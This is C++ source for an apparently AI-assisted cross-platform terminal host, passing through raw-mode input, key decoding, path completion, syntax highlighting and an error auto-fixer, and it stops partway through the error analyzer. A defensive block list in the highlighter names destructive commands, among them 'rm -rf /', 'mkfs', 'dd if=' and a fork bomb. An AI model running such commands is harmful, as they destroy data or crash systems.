// Copyright (c) 2024-2026 Abneesh Singh. All rights reserved.
// Proprietary and Confidential - see LICENSE.txt
/*
 * NeuroShell Enterprise Cross-Platform Native C++20 Terminal Host
 * Platforms: Windows (Win32 ConPTY), Linux (glibc/musl), macOS (Darwin / Apple Silicon & Intel)
 * Standards: C++20
 * Features:
 *  1. Ghost-Text Real-Time Predictive Autocomplete & Path Tab-Completion
 *  2. Bracketed Paste Mode (\033[?2004h) preventing premature newline execution
 *  3. Dynamic Window Resizing (SIGWINCH / WINDOW_BUFFER_SIZE_EVENT)
 *  4. Live Syntax Highlighting & Real-Time Red DANGER Safety Guard
 *  5. Smart Error Shield with 1-Key 'y' Auto-Fixer
 *  6. Native History Store & Interactive 'Ctrl+R' Reverse Search Modal
 *  7. Multi-Tab & Workspace Manager (Ctrl+T, Ctrl+W, Alt+1..9)
 *  8. Multi-Token Deep Directory Jumper ('z', 'f', 'mark', 'bm')
 *  9. Non-Blocking Async Pipe Process Spawner (fork/exec on POSIX, Job Objects on Win32)
 * 10. Inode Cycle-Aware Symlink/Junction Recursion Guard
 * 11. Async-Signal-Safe SEH & POSIX Signal Crash Diagnostics
 * 12. Full-Screen TUI Direct Passthrough (vim, nano, htop, fzf)
 */

#include <iostream>
#include <string>
#include <string_view>
#include <vector>
#include <sstream>
#include <algorithm>
#include <filesystem>
#include <fstream>
#include <chrono>
#include <map>
#include <set>
#include <unordered_set>
#include <regex>
#include <functional>
#include <thread>
#include <mutex>
#include <cctype>
#include <cstring>
#include <cstdlib>

// ═══════════════════════════════════════════════════════════
// Platform-Specific Headers & Abstractions
// ═══════════════════════════════════════════════════════════

#if defined(_WIN32) || defined(_WIN64)
    #define NEUROSHELL_PLATFORM_WINDOWS 1
    #define NOMINMAX
    #define WIN32_LEAN_AND_MEAN
    #include <windows.h>
    #include <shellapi.h>
    #include <conio.h>
#else
    #define NEUROSHELL_PLATFORM_POSIX 1
    #include <unistd.h>
    #include <termios.h>
    #include <sys/types.h>
    #include <sys/stat.h>
    #include <sys/wait.h>
    #include <sys/ioctl.h>
    #include <poll.h>
    #include <signal.h>
    #include <fcntl.h>
    #include <pwd.h>
#endif

#include "ipc_client.hpp"
#include "daemon_spawner.hpp"
#include "pty_host.hpp"
#include "dlp_masker.hpp"
#include "shm_ipc.hpp"
#include "stream_recorder.hpp"
#include "split_pane.hpp"
#include "native_phrases.hpp"
#include "ast_extractor.hpp"
#include "command_palette.hpp"
#include "os_vault.hpp"
#include "task_supervisor.hpp"
#include "test_orchestrator.hpp"
#include "version.hpp"
#include "safe_exec.hpp"
#include "update_installer.hpp"
#include "stream_reader.hpp"
#include "history_engine.hpp"
#include "blast_radius.hpp"
#include "undo_engine.hpp"
#include "sandbox_engine.hpp"

namespace fs = std::filesystem;

// 24-bit TrueColor ANSI Tokens
#define C_CYAN    "\033[38;2;56;189;248m"
#define C_MAGENTA "\033[38;2;192;132;252m"
#define C_GREEN   "\033[38;2;74;222;128m"
#define C_YELLOW  "\033[38;2;251;191;36m"
#define C_RED     "\033[91m\033[38;2;248;113;113m"
#define C_BG_RED  "\033[48;2;239;68;68;38;2;255;255;255m"
#define C_MUTED   "\033[38;2;100;116;139m"
#define C_WHITE   "\033[38;2;241;245;249m"
#define C_GHOST   "\033[38;2;100;116;139m"
#define C_TAB_ACT "\033[48;2;30;41;59;38;2;56;189;248m"
#define C_TAB_IN  "\033[38;2;100;116;139m"
#define C_BOLD    "\033[1m"
#define C_DIM     "\033[2m"
#define C_RESET   "\033[0m"

// Active foreground child process group. When non-zero, a SIGINT received by
// the host is relayed to this group so Ctrl+C actually interrupts the running
// command (raw mode disables ISIG, so without this Ctrl+C was swallowed).
#include <atomic>
static std::atomic<long> g_foreground_pgid{0};

#if defined(NEUROSHELL_PLATFORM_POSIX)
static void NeuroShellSigintRelay(int) {
    long pgid = g_foreground_pgid.load(std::memory_order_relaxed);
    if (pgid > 0) {
        kill(-(pid_t)pgid, SIGINT);
    }
}
#endif

// Repeat a multi-byte UTF-8 glyph N times. std::string(n, '─') is undefined for
// multi-byte glyphs (multi-character constant overflows to a single garbage byte).
static inline std::string RepeatGlyph(const char* glyph, int count) {
    std::string out;
    if (count <= 0) return out;
    size_t glen = std::strlen(glyph);
    out.reserve(static_cast<size_t>(count) * glen);
    for (int i = 0; i < count; ++i) out += glyph;
    return out;
}

// Forward Declaration for Crash Filters
#if defined(NEUROSHELL_PLATFORM_WINDOWS)
LONG WINAPI NeuroShellWin32CrashFilter(EXCEPTION_POINTERS* ep);
#else
void NeuroShellPosixSignalHandler(int sig, siginfo_t* info, void* ucontext);
#endif

// ═══════════════════════════════════════════════════════════
// Data Structures
// ═══════════════════════════════════════════════════════════

struct MenuItem {
    std::string label;
    std::string desc;
    std::string id;
};

struct Tab {
    int id;
    std::string name;
    std::string cwd;
};

struct HistoryEntry {
    std::string command;
    std::string cwd;
    long long timestamp;
};

enum class KeyCode {
    Unknown,
    Printable,
    Enter,
    Backspace,
    Delete,
    Tab,
    Escape,
    Up,
    Down,
    Left,
    Right,
    Home,
    End,
    Ctrl_C,
    Ctrl_L,
    Ctrl_R,
    Ctrl_T,
    Ctrl_W,
    Ctrl_K,
    Ctrl_P,
    F1
};

struct KeyEvent {
    KeyCode code = KeyCode::Unknown;
    char ch = 0;
};

// ═══════════════════════════════════════════════════════════
// Cross-Platform Terminal Subsystem & Raw Mode
// ═══════════════════════════════════════════════════════════

class PlatformTerminal {
private:
#if defined(NEUROSHELL_PLATFORM_WINDOWS)
    DWORD origOutMode = 0;
    DWORD origInMode = 0;
    HANDLE hOut = INVALID_HANDLE_VALUE;
    HANDLE hIn = INVALID_HANDLE_VALUE;
#else
    struct termios origTermios {};
    bool rawEnabled = false;
#endif

public:
    PlatformTerminal() {
        Init();
    }

    ~PlatformTerminal() {
        Restore();
    }

    void Init() {
#if defined(NEUROSHELL_PLATFORM_WINDOWS)
        SetUnhandledExceptionFilter(NeuroShellWin32CrashFilter);
        SetConsoleOutputCP(CP_UTF8);
        SetConsoleCP(CP_UTF8);

        hOut = GetStdHandle(STD_OUTPUT_HANDLE);
        if (hOut != INVALID_HANDLE_VALUE) {
            GetConsoleMode(hOut, &origOutMode);
            DWORD dwMode = origOutMode | ENABLE_VIRTUAL_TERMINAL_PROCESSING | 0x0008;
            SetConsoleMode(hOut, dwMode);
        }

        hIn = GetStdHandle(STD_INPUT_HANDLE);
        if (hIn != INVALID_HANDLE_VALUE) {
            GetConsoleMode(hIn, &origInMode);
            DWORD dwInMode = origInMode | ENABLE_VIRTUAL_TERMINAL_INPUT;
            SetConsoleMode(hIn, dwInMode);
        }

        HANDLE hErr = GetStdHandle(STD_ERROR_HANDLE);
        if (hErr != INVALID_HANDLE_VALUE) {
            DWORD origErrMode = 0;
            if (GetConsoleMode(hErr, &origErrMode)) {
                SetConsoleMode(hErr, origErrMode | ENABLE_VIRTUAL_TERMINAL_PROCESSING);
            }
        }
#else
        struct sigaction sa;
        memset(&sa, 0, sizeof(sa));
        sa.sa_sigaction = NeuroShellPosixSignalHandler;
        sa.sa_flags = SA_SIGINFO;
        sigaction(SIGSEGV, &sa, nullptr);
        sigaction(SIGBUS, &sa, nullptr);
        sigaction(SIGFPE, &sa, nullptr);
        sigaction(SIGILL, &sa, nullptr);

        // SIGINT relay: forward Ctrl+C to the active foreground child job.
        struct sigaction saInt;
        memset(&saInt, 0, sizeof(saInt));
        saInt.sa_handler = NeuroShellSigintRelay;
        saInt.sa_flags = SA_RESTART;
        sigaction(SIGINT, &saInt, nullptr);

        // Don't die on writes to a closed pipe (child exits mid-stream).
        signal(SIGPIPE, SIG_IGN);

        if (isatty(STDIN_FILENO)) {
            if (tcgetattr(STDIN_FILENO, &origTermios) == 0) {
                struct termios raw = origTermios;
                raw.c_lflag &= ~(ICANON | ECHO | ISIG | IEXTEN);
                raw.c_iflag &= ~(IXON | ICRNL);
                raw.c_cc[VMIN] = 1;
                raw.c_cc[VTIME] = 0;
                tcsetattr(STDIN_FILENO, TCSAFLUSH, &raw);
                rawEnabled = true;
            }
        }
#endif
        // Enable Bracketed Paste Mode
        std::cout << "\033[?2004h" << std::flush;
    }

    void Restore() {
        // Disable Bracketed Paste Mode & show cursor
        std::cout << "\033[?2004l\033[?25h\033[0m" << std::flush;
#if defined(NEUROSHELL_PLATFORM_WINDOWS)
        if (hOut != INVALID_HANDLE_VALUE) SetConsoleMode(hOut, origOutMode);
        if (hIn != INVALID_HANDLE_VALUE) SetConsoleMode(hIn, origInMode);
#else
        if (rawEnabled) {
            tcsetattr(STDIN_FILENO, TCSAFLUSH, &origTermios);
            rawEnabled = false;
        }
#endif
    }

    // Temporarily hand the terminal back to a foreground child process:
    // restores cooked mode (ISIG on) so Ctrl+C reaches the child instead of
    // being swallowed by our raw-mode input loop.
    void SuspendRaw() {
#if defined(NEUROSHELL_PLATFORM_WINDOWS)
        if (hIn != INVALID_HANDLE_VALUE) SetConsoleMode(hIn, origInMode);
#else
        if (rawEnabled) {
            tcsetattr(STDIN_FILENO, TCSAFLUSH, &origTermios);
        }
#endif
    }

    void ResumeRaw() {
#if defined(NEUROSHELL_PLATFORM_WINDOWS)
        if (hIn != INVALID_HANDLE_VALUE) {
            DWORD dwInMode = origInMode | ENABLE_VIRTUAL_TERMINAL_INPUT;
            SetConsoleMode(hIn, dwInMode);
        }
#else
        if (rawEnabled && isatty(STDIN_FILENO)) {
            struct termios raw = origTermios;
            raw.c_lflag &= ~(ICANON | ECHO | ISIG | IEXTEN);
            raw.c_iflag &= ~(IXON | ICRNL);
            raw.c_cc[VMIN] = 1;
            raw.c_cc[VTIME] = 0;
            tcsetattr(STDIN_FILENO, TCSAFLUSH, &raw);
        }
#endif
    }

    static void SetTitle(const std::string& title) {
#if defined(NEUROSHELL_PLATFORM_WINDOWS)
        std::wstring wTitle(title.begin(), title.end());
        SetConsoleTitleW(wTitle.c_str());
#else
        std::cout << "\033]0;" << title << "\007" << std::flush;
#endif
    }

    static void ClearScreen() {
        std::cout << "\033[2J\033[H" << std::flush;
    }

    static int GetWindowColumns() {
#if defined(NEUROSHELL_PLATFORM_WINDOWS)
        CONSOLE_SCREEN_BUFFER_INFO csbi;
        HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
        if (hOut != INVALID_HANDLE_VALUE && GetConsoleScreenBufferInfo(hOut, &csbi)) {
            return csbi.srWindow.Right - csbi.srWindow.Left + 1;
        }
#else
        struct winsize ws;
        if (ioctl(STDOUT_FILENO, TIOCGWINSZ, &ws) == 0 && ws.ws_col > 0) {
            return ws.ws_col;
        }
#endif
        return 80;
    }

    static int GetWindowRows() {
#if defined(NEUROSHELL_PLATFORM_WINDOWS)
        CONSOLE_SCREEN_BUFFER_INFO csbi;
        HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
        if (hOut != INVALID_HANDLE_VALUE && GetConsoleScreenBufferInfo(hOut, &csbi)) {
            return csbi.srWindow.Bottom - csbi.srWindow.Top + 1;
        }
#else
        struct winsize ws;
        if (ioctl(STDOUT_FILENO, TIOCGWINSZ, &ws) == 0 && ws.ws_row > 0) {
            return ws.ws_row;
        }
#endif
        return 24;
    }

    KeyEvent ReadKey() {
        KeyEvent ev;
#if defined(NEUROSHELL_PLATFORM_WINDOWS)
        int ch = _getch();
        if (ch == 13 || ch == 10) { ev.code = KeyCode::Enter; return ev; }
        if (ch == 8) { ev.code = KeyCode::Backspace; return ev; }
        if (ch == 9) { ev.code = KeyCode::Tab; return ev; }
        if (ch == 3) { ev.code = KeyCode::Ctrl_C; return ev; }
        if (ch == 11) { ev.code = KeyCode::Ctrl_K; return ev; }
        if (ch == 12) { ev.code = KeyCode::Ctrl_L; return ev; }
        if (ch == 16) { ev.code = KeyCode::Ctrl_P; return ev; }
        if (ch == 18) { ev.code = KeyCode::Ctrl_R; return ev; }
        if (ch == 20) { ev.code = KeyCode::Ctrl_T; return ev; }
        if (ch == 27) {
            if (_kbhit()) {
                int c2 = _getch();
                if (c2 == '[') {
                    if (_kbhit()) {
                        int c3 = _getch();
                        if (c3 == 'A') { ev.code = KeyCode::Up; return ev; }
                        if (c3 == 'B') { ev.code = KeyCode::Down; return ev; }
                        if (c3 == 'C') { ev.code = KeyCode::Right; return ev; }
                        if (c3 == 'D') { ev.code = KeyCode::Left; return ev; }
                        if (c3 == 'H') { ev.code = KeyCode::Home; return ev; }
                        if (c3 == 'F') { ev.code = KeyCode::End; return ev; }
                        if (c3 >= '1' && c3 <= '4') {
                            if (_kbhit()) {
                                int c4 = _getch();
                                if (c4 == '~') {
                                    if (c3 == '1') ev.code = KeyCode::Home;
                                    else if (c3 == '3') ev.code = KeyCode::Delete;
                                    else if (c3 == '4') ev.code = KeyCode::End;
                                    return ev;
                                }
                            }
                        }
                    }
                }
            }
            ev.code = KeyCode::Escape;
            return ev;
        }

        if (ch == 0 || ch == 0xE0 || ch == 224) {
            int code = _getch();
            if (code == 72) ev.code = KeyCode::Up;
            else if (code == 80) ev.code = KeyCode::Down;
            else if (code == 75) ev.code = KeyCode::Left;
            else if (code == 77) ev.code = KeyCode::Right;
            else if (code == 71) ev.code = KeyCode::Home;
            else if (code == 79) ev.code = KeyCode::End;
            else if (code == 83) ev.code = KeyCode::Delete;
            else if (code == 59) ev.code = KeyCode::F1;
            return ev;
        }

        if (ch >= 32 && ch <= 126) {
            ev.code = KeyCode::Printable;
            ev.ch = static_cast<char>(ch);
            return ev;
        }
#else
        char c = 0;
        ssize_t n = read(STDIN_FILENO, &c, 1);
        if (n <= 0) return ev;

        if (c == '\r' || c == '\n') { ev.code = KeyCode::Enter; return ev; }
        if (c == 127 || c == 8) { ev.code = KeyCode::Backspace; return ev; }
        if (c == '\t') { ev.code = KeyCode::Tab; return ev; }
        if (c == 3) { ev.code = KeyCode::Ctrl_C; return ev; }
        if (c == 12) { ev.code = KeyCode::Ctrl_L; return ev; }
        if (c == 18) { ev.code = KeyCode::Ctrl_R; return ev; }
        if (c == 20) { ev.code = KeyCode::Ctrl_T; return ev; }
        if (c == 23) { ev.code = KeyCode::Ctrl_W; return ev; }

        if (c == 27) {
            struct pollfd pfd = { STDIN_FILENO, POLLIN, 0 };
            if (poll(&pfd, 1, 50) > 0) {
                char seq[4] = {0};
                if (read(STDIN_FILENO, &seq[0], 1) > 0) {
                    if (seq[0] == '[') {
                        if (read(STDIN_FILENO, &seq[1], 1) > 0) {
                            if (seq[1] == 'A') { ev.code = KeyCode::Up; return ev; }
                            if (seq[1] == 'B') { ev.code = KeyCode::Down; return ev; }
                            if (seq[1] == 'C') { ev.code = KeyCode::Right; return ev; }
                            if (seq[1] == 'D') { ev.code = KeyCode::Left; return ev; }
                            if (seq[1] == 'H') { ev.code = KeyCode::Home; return ev; }
                            if (seq[1] == 'F') { ev.code = KeyCode::End; return ev; }
                            if (seq[1] >= '1' && seq[1] <= '4') {
                                char t = 0;
                                if (read(STDIN_FILENO, &t, 1) <= 0) { ev.code = KeyCode::Escape; return ev; }
                                if (t == '~') {
                                    if (seq[1] == '1') ev.code = KeyCode::Home;
                                    else if (seq[1] == '3') ev.code = KeyCode::Delete;
                                    else if (seq[1] == '4') ev.code = KeyCode::End;
                                    return ev;
                                }
                            }
                        }
                    }
                }
            }
            ev.code = KeyCode::Escape;
            return ev;
        }

        {
            unsigned char uc = static_cast<unsigned char>(c);
            // Accept printable ASCII AND UTF-8 continuation/lead bytes so
            // non-English input (accents, CJK, emoji in paths) works. Each
            // byte is inserted into the std::string buffer; multi-byte
            // sequences reassemble naturally.
            if ((uc >= 32 && uc != 127) || uc >= 0x80) {
                ev.code = KeyCode::Printable;
                ev.ch = c;
                return ev;
            }
        }
#endif
        return ev;
    }
};

// ═══════════════════════════════════════════════════════════
// Cross-Platform Filesystem & Path Utilities
// ═══════════════════════════════════════════════════════════

class PlatformFS {
public:
    struct FileID {
        uint64_t dev = 0;
        uint64_t ino = 0;

        bool operator==(const FileID& o) const {
            return dev == o.dev && ino == o.ino;
        }
    };

    struct FileIDHasher {
        std::size_t operator()(const FileID& k) const {
            return std::hash<uint64_t>()(k.dev) ^ (std::hash<uint64_t>()(k.ino) << 1);
        }
    };

    static fs::path GetHomeDir() {
#if defined(NEUROSHELL_PLATFORM_WINDOWS)
        const char* userProfile = getenv("USERPROFILE");
        if (userProfile) return fs::path(userProfile);
        const char* homeDrive = getenv("HOMEDRIVE");
        const char* homePath = getenv("HOMEPATH");
        if (homeDrive && homePath) return fs::path(std::string(homeDrive) + std::string(homePath));
        return fs::current_path();
#else
        const char* home = getenv("HOME");
        if (home) return fs::path(home);
        struct passwd* pw = getpwuid(getuid());
        if (pw && pw->pw_dir) return fs::path(pw->pw_dir);
        return fs::current_path();
#endif
    }

    static bool GetUniqueID(const fs::path& p, FileID& outId) {
#if defined(NEUROSHELL_PLATFORM_WINDOWS)
        HANDLE hDir = CreateFileW(p.c_str(), 0, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                                  NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
        if (hDir == INVALID_HANDLE_VALUE) return false;

        BY_HANDLE_FILE_INFORMATION info;
        BOOL ok = GetFileInformationByHandle(hDir, &info);
        CloseHandle(hDir);

        if (ok) {
            outId.dev = info.dwVolumeSerialNumber;
            outId.ino = (static_cast<uint64_t>(info.nFileIndexHigh) << 32) | info.nFileIndexLow;
            return true;
        }
        return false;
#else
        struct stat st;
        if (stat(p.c_str(), &st) == 0) {
            outId.dev = static_cast<uint64_t>(st.st_dev);
            outId.ino = static_cast<uint64_t>(st.st_ino);
            return true;
        }
        return false;
#endif
    }

    static fs::path GetNeuroShellRoot() {
        static fs::path s_root;
        if (!s_root.empty()) return s_root;

#if defined(NEUROSHELL_PLATFORM_WINDOWS)
        wchar_t exeBuf[MAX_PATH * 2];
        DWORD n = GetModuleFileNameW(nullptr, exeBuf, MAX_PATH * 2);
        if (n > 0) {
            fs::path candidate = fs::path(exeBuf).parent_path();
            for (int i = 0; i < 4; ++i) {
                if (fs::exists(candidate / "core") && (fs::exists(candidate / "ui") || fs::exists(candidate / "intelligence"))) {
                    s_root = candidate;
                    return s_root;
                }
                if (candidate.has_parent_path() && candidate != candidate.parent_path()) {
                    candidate = candidate.parent_path();
                } else {
                    break;
                }
            }
        }
#else
        char exeBuf[PATH_MAX];
        ssize_t n = readlink("/proc/self/exe", exeBuf, sizeof(exeBuf) - 1);
        if (n > 0) {
            exeBuf[n] = '\0';
            fs::path candidate = fs::path(exeBuf).parent_path();
            for (int i = 0; i < 4; ++i) {
                if (fs::exists(candidate / "core") && (fs::exists(candidate / "ui") || fs::exists(candidate / "intelligence"))) {
                    s_root = candidate;
                    return s_root;
                }
                if (candidate.has_parent_path() && candidate != candidate.parent_path()) {
                    candidate = candidate.parent_path();
                } else {
                    break;
                }
            }
        }
#endif
        if (fs::exists("core") && (fs::exists("ui") || fs::exists("intelligence"))) {
            s_root = fs::current_path();
        } else if (fs::exists("../core") && (fs::exists("../ui") || fs::exists("../intelligence"))) {
            s_root = fs::current_path().parent_path();
        } else {
            s_root = fs::current_path();
        }
        return s_root;
    }
};

// ═══════════════════════════════════════════════════════════
// Native Prediction, Ghost-Text & Path Completion Engine
// ═══════════════════════════════════════════════════════════

class PredictionEngine {
private:
    std::vector<std::string> dictionary;

public:
    PredictionEngine() {
        dictionary = {
            "test", "test changed", "test all", "test modified files",
            "start frontend and backend", "run dev and api", "run backend and worker",
            "tasks", "stop all", "show wifi passwords", "show open ports", "system specs",
            "git status", "git commit -m \"update\"", "git push origin main", "git pull origin main",
            "git add .", "git diff", "git log --oneline -n 10", "git checkout -b ", "git branch -a",
            "python main.py", "python -m pytest", "python -m venv .venv",
            "pip install -r requirements.txt", "pip install ", "pip list", "pip freeze",
            "npm install", "npm run dev", "npm run build", "npm test", "npm start",
            "cargo build --release", "cargo run", "cargo test", "cargo check",
            "docker ps -a", "docker compose up -d", "docker build -t app .", "docker stop ",
            "open file explorer", "open current folder", "find all python files", "find all javascript files",
            "show my github repos", "list my repos", "kill port 8000", "kill port 3000", "show active ports",
            "system info", "ipconfig", "clear", "exit",
            "/palette", "/api-key", "/model", "/theme", "/tasks", "/help"
        };
    }

    void Learn(const std::string& cmd) {
        if (cmd.length() < 2) return;
        auto it = std::find(dictionary.begin(), dictionary.end(), cmd);
        if (it != dictionary.end()) {
            dictionary.erase(it);
        }
        dictionary.insert(dictionary.begin(), cmd);
    }

    std::string GetSuggestion(const std::string& prefix) {
        if (prefix.empty()) return "";
        std::string lowerPref = prefix;
        std::transform(lowerPref.begin(), lowerPref.end(), lowerPref.begin(), ::tolower);

        for (const auto& item : dictionary) {
            std::string lowerItem = item;
            std::transform(lowerItem.begin(), lowerItem.end(), lowerItem.begin(), ::tolower);

            if (lowerItem.rfind(lowerPref, 0) == 0 && lowerItem.length() > lowerPref.length()) {
                return item.substr(prefix.length());
            }
        }
        return "";
    }

    std::string GetPathCompletion(const std::string& buffer) {
        if (buffer.empty()) return "";
        size_t lastSpace = buffer.find_last_of(" \t");
        std::string token = (lastSpace == std::string::npos) ? buffer : buffer.substr(lastSpace + 1);

        if (token.empty()) return "";

        try {
            fs::path p(token);
            fs::path dir = p.parent_path().empty() ? fs::current_path() : p.parent_path();
            std::string stem = p.filename().string();

            if (fs::exists(dir)) {
                for (const auto& entry : fs::directory_iterator(dir)) {
                    std::string filename = entry.path().filename().string();
                    if (filename.rfind(stem, 0) == 0 && filename.length() > stem.length()) {
                        std::string completion = filename.substr(stem.length());
                        if (entry.is_directory()) completion += "/";
                        return completion;
                    }
                }
            }
        } catch (...) {}
        return "";
    }
};

// ═══════════════════════════════════════════════════════════
// Real-Time Syntax Highlighter & Safety Lexer
// ═══════════════════════════════════════════════════════════

class SyntaxHighlighter {
private:
    std::set<std::string> knownExecutables = {
        "git", "python", "python3", "pip", "pip3", "npm", "npx", "node", "cargo", "rustc",
        "docker", "kubectl", "dir", "ls", "cd", "cls", "clear", "echo", "cat", "cp", "mv",
        "rm", "mkdir", "rmdir", "start", "tasklist", "taskkill", "ps", "kill", "netstat", "ss",
        "ipconfig", "ifconfig", "ip", "systeminfo", "uname", "findstr", "grep", "curl", "ssh", "tar", "code", "vim", "brew"
    };

    std::vector<std::string> dangerousPatterns = {
        "rm -rf /", "rm -rf *", "del /f", "del /s", "format ", "drop database", "drop table",
        "mkfs", "dd if=", ":(){ :|:& };:", "rmdir /s"
    };

public:
    bool IsDangerous(const std::string& input, std::string& matchedPattern) {
        std::string lower = input;
        std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);

        for (const auto& p : dangerousPatterns) {
            if (lower.find(p) != std::string::npos) {
                matchedPattern = p;
                return true;
            }
        }
        return false;
    }

    std::string Highlight(const std::string& input) {
        if (input.empty()) return "";

        std::string dangerPattern;
        bool dangerous = IsDangerous(input, dangerPattern);

        std::string result = "";
        if (dangerous) {
            result += std::string(C_BG_RED) + " DANGER " + C_RESET + " ";
        }

        if (input[0] == '/') {
            return std::string(C_BOLD) + C_MAGENTA + input + C_RESET;
        }

        size_t idx = 0;
        bool isFirst = true;
        while (idx < input.length()) {
            if (input[idx] == ' ') {
                result += ' ';
                idx++;
                continue;
            }

            if (input[idx] == '"' || input[idx] == '\'') {
                char quote = input[idx];
                size_t endQuote = input.find(quote, idx + 1);
                if (endQuote == std::string::npos) endQuote = input.length() - 1;
                std::string strVal = input.substr(idx, endQuote - idx + 1);
                result += std::string(C_YELLOW) + strVal + C_RESET;
                idx = endQuote + 1;
                isFirst = false;
                continue;
            }

            size_t nextSpace = input.find(' ', idx);
            if (nextSpace == std::string::npos) nextSpace = input.length();
            std::string word = input.substr(idx, nextSpace - idx);

            if (isFirst) {
                std::string lowerWord = word;
                std::transform(lowerWord.begin(), lowerWord.end(), lowerWord.begin(), ::tolower);
                if (knownExecutables.count(lowerWord) > 0) {
                    result += std::string(C_BOLD) + C_GREEN + word + C_RESET;
                } else if (dangerous) {
                    result += std::string(C_BOLD) + C_RED + word + C_RESET;
                } else {
                    result += std::string(C_CYAN) + word + C_RESET;
                }
                isFirst = false;
            } else {
                if (word.rfind("-", 0) == 0 || word.rfind("/", 0) == 0) {
                    result += std::string(C_CYAN) + word + C_RESET;
                } else if (word.find("\\") != std::string::npos || word.find("/") != std::string::npos || word.find(".") != std::string::npos) {
                    result += std::string(C_YELLOW) + word + C_RESET;
                } else if (dangerous) {
                    result += std::string(C_RED) + word + C_RESET;
                } else {
                    result += std::string(C_WHITE) + word + C_RESET;
                }
            }

            idx = nextSpace;
        }

        return result;
    }
};

// ═══════════════════════════════════════════════════════════
// Smart Error Diagnostics & 1-Key Auto-Fix Shield
// ═══════════════════════════════════════════════════════════

class SmartErrorShield {
public:
    struct ErrorReport {
        bool hasError = false;
        std::string category;
        std::string detail;
        std::string location;
        std::string autoFixCmd;
    };

    ErrorReport Analyze(const std::string& output, int exitCode, const std::string& lastCmd) {
        ErrorReport rep;
        if (exitCode == 0 && output.find("Error:") == std::string::npos && output.find("Exception") == std::string::npos && output.find("ParserError") == std::string::npos) {
            return rep;
        }

        std::string lowerOut = output;
        std::transform(lowerOut.begin(), lowerOut.end(), lowerOut.begin(), ::tolower);

        // 1. PowerShell syntax and parsing errors
        if (output.find("Unexpected token") != std::string::npos || output.find("CategoryInfo          : ParserError") != std::string::npos ||
            output.find("MissingExpressionAfterOperator") != std::string::npos) {
            rep.hasError = true;
            rep.category = "PowerShell Syntax / Quoting Error";
            rep.detail = "PowerShell treats quoted command paths as string literals. Use '&' operator or execute directly via cmd.exe.";
            if (!lastCmd.empty() && lastCmd[0] == '"') {
                rep.autoFixCmd = "& " + lastCmd;
            } else {
                rep.autoFixCmd = "cmd.exe /s /c " + lastCmd;
            }
        }
        // 2. Windows CMD 'delete' / 'uninstall' not recognized
        else if (lowerOut.find("'delete' is not recognized") != std::string::npos) {
            rep.hasError = true;
            rep.category = "Windows Shell Command Missing";
            rep.detail = "Windows CMD has no 'delete' command. Use NeuroShell universal delete ('delete <target>') or Windows 'del'.";
            std::string sub = lastCmd;
            if (sub.rfind("delete", 0) == 0) sub = sub.substr(6);
            sub.erase(0, sub.find_first_not_of(" \t"));
            rep.autoFixCmd = "delete " + sub;
        }
        else if (lowerOut.find("'uninstall' is not recognized") != std::string::npos) {
            rep.hasError = true;
            rep.category = "Windows Shell Command Missing";
            rep.detail = "Windows CMD has no 'uninstall' command. Use NeuroShell 'uninstall <app>' or 'winget uninstall <app>'.";
            std::string sub = lastCmd;
            if (sub.rfind("uninstall", 0) == 0) sub = sub.substr(9);
            sub.erase(0, sub.find_first_not_of(" \t"));
            rep.autoFixCmd = "uninstall " + sub;
        }
        else if (lowerOut.find("the directory name is invalid") != std::string::npos && lastCmd.find("del ") != std::string::npos) {
            rep.hasError = true;
            rep.category = "Directory Deletion Error";
            rep.detail = "The 'del' command only deletes files, not directories. Use 'rmdir /s /q <folder>' or 'delete <folder>'.";
            std::string sub = lastCmd.substr(lastCmd.find("del ") + 4);
            sub.erase(0, sub.find_first_not_of(" \t"));
            rep.autoFixCmd = "delete " + sub;
        }
        // 3. Unix commands typed in Windows
        else if (lowerOut.find("not recognized as an internal or external command") != std::string::npos ||
                 lowerOut.find("command not found") != std::string::npos) {
            rep.hasError = true;
            rep.category = "Command Not Found";
            std::string cmdFirst = lastCmd;
            size_t sp = cmdFirst.find(' ');
            if (sp != std::string::npos) cmdFirst = cmdFirst.substr(0, sp);

            if (cmdFirst == "touch") {
                rep.detail = "Unix 'touch' is not in Windows CMD. Use 'type nul > <file>' to create new empty files.";
                std::string arg = lastCmd.size() > 6 ? lastCmd.substr(6) : "file.txt";
                rep.autoFixCmd = "type nul > " + arg;
            } else if (cmdFirst == "grep") {
                rep.detail = "Unix 'grep' is not in Windows CMD. Use 'findstr' to search text patterns.";
                std::string arg = lastCmd.size() > 5 ? lastCmd.substr(5) : "";
                rep.autoFixCmd = "findstr " + arg;
            } else if (cmdFirst == "ls") {
                rep.detail = "Unix 'ls' is not in Windows CMD. Use 'dir' to list directory files.";
                rep.autoFixCmd = "dir";
            } else if (cmdFirst == "clear") {
                rep.detail = "Unix 'clear' is not in Windows CMD. Use 'cls' to clear the console.";
                rep.autoFixCmd = "cls";
            } else if (cmdFirst == "cat") {
                rep.detail = "Unix 'cat' is not in Windows CMD. Use 'type' to display file contents.";
                std::string arg = lastCmd.size() > 4 ? lastCmd.substr(4) : "";
                rep.autoFixCmd = "type " + arg;
            } else if (cmdFirst == "rm") {
                rep.detail = "Unix 'rm' is not in Windows CMD. Use NeuroShell 'delete <target>'.";
                std::string arg = lastCmd.size() > 3 ? lastCmd.substr(3) : "";
                rep.autoFixCmd = "delete " + arg;
            } else if (cmdFirst == "gti") {
                rep.detail = "Typo detected: 'gti' instead of 'git'.";
                rep.autoFixCmd = "git" + (lastCmd.size() > 3 ? lastCmd.substr(3) : "");
            } else if (cmdFirst == "pyhton" || cmdFirst == "pythn") {
                rep.detail = "Typo detected: 'pyhton' instead of 'python'.";
                rep.autoFixCmd = "python" + (lastCmd.size() > 6 ? lastCmd.substr(6) : "");
            } else if (cmdFirst == "dockr") {
                rep.detail = "Typo detected: 'dockr' instead of 'docker'.";
                rep.autoFixCmd = "docker" + (lastCmd.size() > 5 ? lastCmd.substr(5) : "");
            } else if (cmdFirst == "npn") {
                rep.detail = "Typo detected: 'npn' instead of 'npm'.";
                rep.autoFixCmd = "npm" + (lastCmd.size() > 3 ? lastCmd.substr(3) : "");
            } else {
                rep.detail = "'" + cmdFirst + "' is not recognized. Check spelling or install it.";
            }
        }
        // 4. Missing Python Dependency
        else if (output.find("ModuleNotFoundError: No module named ") != std::string::npos) {
            rep.hasError = true;
            rep.category = "Missing Python Dependency";
